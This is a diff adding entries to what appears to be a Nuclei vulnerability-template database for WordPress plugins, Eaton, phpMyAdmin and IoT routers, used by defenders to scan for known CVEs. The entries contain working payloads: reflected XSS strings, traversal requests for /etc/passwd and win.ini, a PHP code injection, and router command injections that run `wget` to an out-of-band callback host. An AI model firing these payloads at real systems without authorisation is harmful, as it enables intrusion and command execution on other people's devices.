@@ -770,6 +770,48 @@
       ]
     },
     {
+      "id": "CVE-2012-1835",
+      "info": {
+        "author": "daffainfo",
+        "description": "Multiple cross-site scripting (XSS) vulnerabilities in the All-in-One Event Calendar plugin 1.4 and 1.5 for WordPress allow remote attackers to inject arbitrary web script or HTML via the (1) title parameter to app/view/agenda-widget-form.php; (2) args, (3) title, (4) before_title, or (5) after_title parameter to app/view/agenda-widget.php; (6) button_value parameter to app/view/box_publish_button.php; or (7) msg parameter to /app/view/save_successful.php.",
+        "name": "WordPress Plugin All-in-One Event Calendar 1.4 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2012-1835",
+        "severity": "medium",
+        "tags": "cve,cve2012,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123);</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?title=%3Cscript%3Ealert%28123%29;%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2012-2371",
       "info": {
         "author": "daffainfo",
@@ -2230,6 +2272,43 @@
       ]
     },
     {
+      "id": "CVE-2016-10960",
+      "info": {
+        "author": "daffainfo",
+        "description": "The wsecure plugin before 2.4 for WordPress has remote code execution via shell metacharacters in the wsecure-config.php publish parameter.",
+        "name": "wSecure Lite < 2.4 - Remote Code Execution (RCE)",
+        "reference": "- https://www.pluginvulnerabilities.com/2016/07/12/remote-code-execution-rce-vulnerability-in-wsecure-lite/\n- https://www.acunetix.com/vulnerabilities/web/wordpress-plugin-wsecure-lite-remote-code-execution-2-3/\n- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10960\n",
+        "severity": "critical",
+        "tags": "cve,cve2016,wordpress,wp-plugin,rce"
+      },
+      "requests": [
+        {
+          "body": "wsecure_action=update&publish=\";} header(\"Nuclei: CVE-2016-10960\"); class WSecureConfig2 {var $test=\"",
+          "matchers": [
+            {
+              "condition": "and",
+              "part": "header",
+              "type": "word",
+              "words": [
+                "Nuclei: CVE-2016-10960"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wsecure/wsecure-config.php"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-3081",
       "info": {
         "author": "dhiyaneshDK",
@@ -3091,6 +3170,133 @@
       ]
     },
     {
+      "id": "CVE-2017-17043",
+      "info": {
+        "author": "daffainfo",
+        "description": "The Emag Marketplace Connector plugin 1.0.0 for WordPress has reflected XSS because the parameter \"post\" to /wp-content/plugins/emag-marketplace-connector/templates/order/awb-meta-box.php is not filtered correctly.",
+        "name": "Emag Marketplace Connector 1.0 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-17043",
+        "severity": "medium",
+        "tags": "cve,cve2017,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/emag-marketplace-connector/templates/order/awb-meta-box.php?post=%22%2F%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-17059",
+      "info": {
+        "author": "daffainfo",
+        "description": "XSS exists in the amtyThumb amty-thumb-recent-post (aka amtyThumb posts or wp-thumb-post) plugin 8.1.3 for WordPress via the query string to amtyThumbPostsAdminPg.php.",
+        "name": "amtyThumb posts 8.1.3 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "- https://github.com/NaturalIntelligence/wp-thumb-post/issues/1\n- https://nvd.nist.gov/vuln/detail/CVE-2017-17059\n",
+        "severity": "medium",
+        "tags": "cve,cve2017,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "body": "amty_hidden=1",
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "POST",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/amty-thumb-recent-post/amtyThumbPostsAdminPg.php?%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E=1"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-17451",
+      "info": {
+        "author": "daffainfo",
+        "description": "The WP Mailster plugin before 1.5.5 for WordPress has XSS in the unsubscribe handler via the mes parameter to view/subscription/unsubscribe2.php.",
+        "name": "WP Mailster <= 1.5.4 - Unauthenticated Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-17451",
+        "severity": "medium",
+        "tags": "cve,cve2017,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/wp-mailster/view/subscription/unsubscribe2.php?mes=%3C%2Fscript%3E%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2017-17562",
       "info": {
         "author": "geeknik",
@@ -3191,6 +3397,48 @@
           },
           "raw": [
             "GET /cgi-bin/§endpoint§?LD_DEBUG=help HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\nAccept: */*\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-18536",
+      "info": {
+        "author": "daffainfo",
+        "description": "The Stop User Enumeration WordPress plugin was affected by an Unauthenticated Reflected Cross-Site Scripting (XSS) security vulnerability.",
+        "name": "Stop User Enumeration 1.3.5-1.3.7 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://wpscan.com/vulnerability/956cc5fd-af06-43ac-aa85-46b468c73501",
+        "severity": "medium",
+        "tags": "cve,cve2017,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<img src=x onerror=javascript:prompt(123)>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?author=1%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aprompt%28123%29%3E"
           ]
         }
       ]
@@ -3621,6 +3869,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/Telerik.ReportViewer.axd?optype=Parameters&bgColor=_000000%22onload=%22prompt(1)"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2017-9288",
+      "info": {
+        "author": "daffainfo",
+        "description": "The Raygun4WP plugin 1.8.0 for WordPress is vulnerable to a reflected XSS in sendtesterror.php (backurl parameter).",
+        "name": "Raygun4WP <= 1.8.0 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-9288",
+        "severity": "medium",
+        "tags": "cve,cve2017,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<img src=x onerror=alert(123)>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/raygun4wp/sendtesterror.php?backurl=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert%28123%29%3E"
           ]
         }
       ]
@@ -4080,6 +4370,48 @@
       ]
     },
     {
+      "id": "CVE-2018-11709",
+      "info": {
+        "author": "daffainfo",
+        "description": "wpforo_get_request_uri in wpf-includes/functions.php in the wpForo Forum plugin before 1.4.12 for WordPress allows Unauthenticated Reflected Cross-Site Scripting (XSS) via the URI.",
+        "name": "wpForo Forum <= 1.4.11 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-11709",
+        "severity": "medium",
+        "tags": "cve,cve2018,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/index.php/community/?%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-11759",
       "info": {
         "author": "harshbothra_",
@@ -4170,6 +4502,44 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}//example.com"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-12031",
+      "info": {
+        "author": "daffainfo",
+        "description": "Local file inclusion in Eaton Intelligent Power Manager v1.6 allows an attacker to include a file, it can lead to sensitive information disclosure, denial of service and code execution.",
+        "name": "Eaton Intelligent Power Manager 1.6 - Directory Traversal",
+        "reference": "- https://github.com/EmreOvunc/Eaton-Intelligent-Power-Manager-Local-File-Inclusion\n- https://nvd.nist.gov/vuln/detail/CVE-2018-12031\n- https://www.exploit-db.com/exploits/48614\n",
+        "severity": "high",
+        "tags": "cve,cve2018,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "or",
+              "part": "body",
+              "regex": [
+                "root:[0*]:0:0",
+                "\\[(font|extension|file)s\\]"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../etc/passwd",
+            "{{BaseURL}}/server/node_upgrade_srv.js?action=downloadFirmware&firmware=/../../../../../../../../../../Windows/win.ini"
           ]
         }
       ]
@@ -5124,6 +5494,48 @@
       ]
     },
     {
+      "id": "CVE-2018-20462",
+      "info": {
+        "author": "daffainfo",
+        "description": "An issue was discovered in the JSmol2WP plugin 1.07 for WordPress. A cross-site scripting (XSS) vulnerability allows remote attackers to inject arbitrary web script or HTML via the jsmol.php data parameter.",
+        "name": "JSmol2WP <= 1.07 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-20462",
+        "severity": "medium",
+        "tags": "cve,cve2018,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&mimetype=text/html;%20charset=utf-8"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2018-20824",
       "info": {
         "author": "madrobot,dwisiswant0",
@@ -5491,6 +5903,48 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/pages/includes/status-list-mo%3CIFRAME%20SRC%3D%22javascript%3Aalert%281337%29%22%3E.vm"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-5316",
+      "info": {
+        "author": "daffainfo",
+        "description": "The SagePay Server Gateway for WooCommerce plugin before 1.0.9 for WordPress has XSS via the includes/pages/redirect.php page parameter.",
+        "name": "SagePay Server Gateway for WooCommerce <= 1.0.8 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2018-5316",
+        "severity": "medium",
+        "tags": "cve,cve2018,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/sagepay-server-gateway-for-woocommerce/includes/pages/redirect.php?page=%3C%2Fscript%3E%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -6435,6 +6889,42 @@
       ]
     },
     {
+      "id": "CVE-2019-12616",
+      "info": {
+        "author": "Mohammedsaneem",
+        "description": "A vulnerability was found that allows an attacker to trigger a CSRF attack against a phpMyAdmin user. The attacker can trick the user, for instance through a broken <img> tag pointing at the victim's phpMyAdmin database, and the attacker can potentially deliver a payload (such as a specific INSERT or DELETE statement) through the victim.",
+        "name": "phpMyAdmin CSRF",
+        "reference": "- https://www.phpmyadmin.net/security/PMASA-2019-4/\n- https://www.exploit-db.com/exploits/46982\n- https://nvd.nist.gov/vuln/detail/CVE-2019-12616\n",
+        "severity": "medium",
+        "tags": "cve,cve2019,phpmyadmin,csrf"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "4.6.6deb4+deb9u2",
+                "phpMyAdmin"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/phpmyadmin/"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-12725",
       "info": {
         "author": "dwisiswant0",
@@ -6814,6 +7304,48 @@
       ]
     },
     {
+      "id": "CVE-2019-15713",
+      "info": {
+        "author": "daffainfo",
+        "description": "Triggered via unescaped usage of URL parameters in multiple locations presented in the public view of a site.",
+        "name": "My Calendar <= 3.1.9 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "- https://wpscan.com/vulnerability/9267\n- https://nvd.nist.gov/vuln/detail/CVE-2019-15713\n",
+        "severity": "medium",
+        "tags": "cve,cve2019,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<svg/onload=confirm(123)>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/?rsd=%27%3E%3Csvg%2Fonload%3Dconfirm%28123%29%3E"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2019-15858",
       "info": {
         "author": "dwisiswant0,fmunozs,patralos",
@@ -7012,6 +7544,90 @@
           ],
           "raw": [
             "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nContent-Length: 1\nConnection: close\n\necho\necho\ncat /etc/passwd 2>&1\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-16332",
+      "info": {
+        "author": "daffainfo",
+        "description": "In the api-bearer-auth plugin before 20190907 for WordPress, the server parameter is not correctly filtered in the swagger-config.yaml.php file, and it is possible to inject JavaScript code, aka XSS.",
+        "name": "API Bearer Auth <= 20181229 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-16332",
+        "severity": "medium",
+        "tags": "cve,cve2019,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/api-bearer-auth/swagger/swagger-config.yaml.php?&server=%3Cscript%3Ealert%28123%29%3C/script%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-16525",
+      "info": {
+        "author": "daffainfo",
+        "description": "An XSS issue was discovered in the checklist plugin before 1.1.9 for WordPress. The fill parameter is not correctly filtered in the checklist-icon.php file, and it is possible to inject JavaScript code.",
+        "name": "Wordpress Plugin Checklist <= 1.1.5 - Reflected Cross-Site Scripting (XSS)",
+        "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-16525",
+        "severity": "medium",
+        "tags": "cve,cve2019,wordpress,xss,wp-plugin"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "<script>alert(123)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/wp-content/plugins/checklist/images/checklist-icon.php?&fill=%22%3E%3Cscript%3Ealert%28123%29%3C%2Fscript%3E%3C%2Fpath%3E"
           ]
         }
       ]
@@ -7585,6 +8201,41 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-admin/admin.php?page=download_report&report=users&status=all"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2019-20085",
+      "info": {
+        "author": "daffainfo",
+        "description": "TVT NVMS-1000 devices allow GET /.. Directory Traversal",
+        "name": "TVT NVMS 1000 - Directory Traversal",
+        "reference": "- https://nvd.nist.gov/vuln/detail/CVE-2019-20085\n- https://www.exploit-db.com/exploits/48311\n",
+        "severity": "high",
+        "tags": "cve,cve2019,iot,lfi"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "\\[(font|extension|file)s\\]"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/../../../../../../../../../../../Windows/win.ini"
           ]
         }
       ]
@@ -9317,10 +9968,12 @@
         {
           "matchers": [
             {
+              "condition": "and",
               "part": "body",
               "type": "word",
               "words": [
-                "<img src=x onerror=alert(123);>"
+                "<img src=x onerror=alert(123);>",
+                "catch-breadcrumb"
               ]
             },
             {
@@ -10345,6 +10998,13 @@
               "type": "word",
               "words": [
                 "<img src onerror=alert(123)>"
+              ]
+            },
+            {
+              "part": "body",
+              "type": "word",
+              "words": [
+                "nova-lite"
               ]
             },
             {
@@ -11409,6 +12069,34 @@
       ]
     },
     {
+      "id": "CVE-2020-25506",
+      "info": {
+        "author": "gy741",
+        "description": "The exploit targets a command injection vulnerability in a system_mgr.cgi component. The component does not successfully sanitize the value of the HTTP parameters f_ntp_server, which in turn leads to arbitrary command execution.",
+        "name": "D-Link DNS-320 - Unauthenticated Remote Code Execution",
+        "reference": "- https://gist.github.com/WinMin/6f63fd1ae95977e0e2d49bd4b5f00675\n- https://unit42.paloaltonetworks.com/mirai-variant-iot-vulnerabilities/\n",
+        "severity": "critical",
+        "tags": "cve,cve2020,dlink,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /cgi-bin/system_mgr.cgi? HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n\nC1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}`\n",
+            "POST /cgi-bin/system_mgr.cgi?C1=ON&cmd=cgi_ntp_time&f_ntp_server=`wget http://{{interactsh-url}}` HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2020-2551",
       "info": {
         "author": "dwisiswant0",
@@ -11566,6 +12254,33 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/api/config"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-26919",
+      "info": {
+        "author": "gy741",
+        "description": "It was found that every section of the web could be used as a valid endpoint to submit POST requests being the action defined by the submitId argument. The problem was located in the login.html webpage, that has to be publicly available to perform login requests but does not implement any restriction for executing debug actions. This will allow users execute system commands.",
+        "name": "Netgear ProSAFE Plus - Unauthenticated Remote Code Execution",
+        "reference": "- https://research.nccgroup.com/2021/03/08/technical-advisory-multiple-vulnerabilities-in-netgear-prosafe-plus-jgs516pe-gs116ev2-switches/\n- https://unit42.paloaltonetworks.com/mirai-variant-iot-vulnerabilities/\n",
+        "severity": "critical",
+        "tags": "cve,cve2020,netgear,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /login.htm HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nConnection: close\n\nsubmitId=debug&debugCmd=wget+http://{{interactsh-url}}&submitEnd=\n"
           ]
         }
       ]
@@ -12012,6 +12727,33 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/contact-form-7/readme.txt"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-35713",
+      "info": {
+        "author": "gy741",
+        "description": "Belkin LINKSYS RE6500 devices before 1.0.012.001 allow remote attackers to execute arbitrary commands or set a new password via shell metacharacters to the goform/setSysAdm page.",
+        "name": "Linksys RE6500 Pre-Auth RCE",
+        "reference": "https://resolverblog.blogspot.com/2020/07/linksys-re6500-unauthenticated-rce-full.html",
+        "severity": "critical",
+        "tags": "cve,cve2020,linksys,rce,oob,router"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /goform/setSysAdm HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept-Encoding: gzip, deflate\nAccept: */*\nConnection: keep-alive\nOrigin: http://{{Hostname}}\nReferer: http://{{Hostname}}/login.shtml\n\nadmuser=admin&admpass=;wget http://{{interactsh-url}};&admpasshint=61646D696E=&AuthTimeout=600&wirelessMgmt_http=1\n"
           ]
         }
       ]
@@ -16176,6 +16918,33 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/rewe/prod/web/rewe_go_check.php?config=rewe&version=7.5.0%3cscript%3econfirm({{randstr}})%3c%2fscript%3e&win=2707"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-31755",
+      "info": {
+        "author": "gy741",
+        "description": "Vulnerabilities in the web-based management interface of enda Router AC11 could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device.",
+        "name": "Tenda Router AC11 RCE",
+        "reference": "- https://github.com/Yu3H0/IoT_CVE/tree/main/Tenda/CVE_3\n- https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai\n",
+        "severity": "critical",
+        "tags": "cve,cve2021,tenda,rce,oob"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "interactsh_protocol",
+              "type": "word",
+              "words": [
+                "http"
+              ]
+            }
+          ],
+          "raw": [
+            "POST /goform/setmac HTTP/1.1\nHost: {{Hostname}}\nConnection: close\nAccept-Encoding: gzip, deflate\nAccept: */*\nOrigin: http://{{Hostname}}\nReferer: http://{{Hostname}}/index.htmlr\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\nContent-Type: application/x-www-form-urlencoded\n\nmodule1=wifiBasicCfg&doubleBandUnityEnable=false&wifiTotalEn=true&wifiEn=true&wifiSSID=Tenda_B0E040&mac=wget+http://{{interactsh-url}}&wifiSecurityMode=WPAWPA2%2FAES&wifiPwd=Password12345&wifiHideSSID=false&wifiEn_5G=true&wifiSSID_5G=Tenda_B0E040_5G&wifiSecurityMode_5G=WPAWPA2%2FAES&wifiPwd_5G=Password12345&wifiHideSSID_5G=false&module2=wifiGuest&guestEn=false&guestEn_5G=false&guestSSID=Tenda_VIP&guestSSID_5G=Tenda_VIP_5G&guestPwd=&guestPwd_5G=&guestValidTime=8&guestShareSpeed=0&module3=wifiPower&wifiPower=high&wifiPower_5G=high&module5=wifiAdvCfg&wifiMode=bgn&wifiChannel=auto&wifiBandwidth=auto&wifiMode_5G=ac&wifiChannel_5G=auto&wifiBandwidth_5G=auto&wifiAntijamEn=false&module6=wifiBeamforming&wifiBeaformingEn=true&module7=wifiWPS&wpsEn=true&wanType=static\n"
           ]
         }
       ]
